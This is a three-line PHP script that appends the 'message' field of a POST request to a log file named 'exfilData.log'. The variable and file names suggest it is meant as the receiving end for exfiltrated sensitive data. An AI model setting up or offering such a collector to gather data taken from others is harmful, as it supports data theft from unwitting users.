<?php
$sensitiveData = $_POST['message'];
file_put_contents("../db/exfilData.log", $sensitiveData . "\n", FILE_APPEND);
